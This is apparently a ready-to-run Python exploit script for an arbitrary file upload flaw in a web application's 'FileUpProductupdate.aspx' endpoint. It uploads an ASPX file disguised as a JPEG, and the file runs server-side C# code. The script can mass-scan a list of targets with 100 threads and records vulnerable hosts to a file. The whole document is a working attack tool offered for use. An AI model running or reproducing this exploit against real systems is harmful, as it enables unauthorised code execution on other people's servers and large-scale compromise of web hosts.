import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

███████╗██╗  ██╗██╗  ██╗██╗   ██╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
╚══███╔╝██║  ██║╚██╗██╔╝╚██╗ ██╔╝██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
  ███╔╝ ███████║ ╚███╔╝  ╚████╔╝ ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
 ███╔╝  ██╔══██║ ██╔██╗   ╚██╔╝  ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
███████╗██║  ██║██╔╝ ██╗   ██║   ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                                                                          
                                                                    version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/Module/FileUpPage/FileUpProductupdate.aspx"
    url = target+payload_url
    headers={
        'User-Agent':'Mozilla/4.0(compatible; MSIE 7.0;Windows NT 5.1;Trident/4.0; SV1;QQDownload732;.NET4.0C;.NET4.0E; SE 2.XMetaSr1.0)',
        'Content-Length':'217',
        'Content-Type': 'multipart/form-data; boundary=---***',
        'X-Requested-With':'XMLHttpRequest',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close'
    }
    data = (
        "-----***\r\n"
        'Content-Disposition: form-data; name="Filedata"; filename="test.aspx"\r\n'
        'Content-Type: image/jpeg\r\n'
        "\r\n"
        '<%@PageLanguage="C#"%><%Response.Write("test");System.IO.File.Delete(Request.PhysicalPath);%>\r\n'
        "-----***--\r\n"
    )
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and '85e46edfc9f2611aadbc2da226b4ad45' in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()